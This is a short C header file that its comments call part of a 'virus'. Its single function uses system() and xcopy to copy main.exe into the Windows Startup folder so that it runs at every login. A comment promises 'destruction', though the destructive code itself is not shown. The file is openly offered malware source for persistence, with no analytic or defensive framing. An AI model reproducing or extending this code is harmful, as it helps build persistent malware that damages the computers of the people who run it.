//This is make.h
/*Basically, this moves our virus to startup folder so that it gets executed at every startup*/

#include <stdlib.h>//#include handler caused conflict cos it was including itself

//The Destruction will be funny lol

//Made a Function startupexec to move it to startup folder

void startupexec()
{
    system("xcopy main.exe \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
    //copies main.exe to startup folder
}


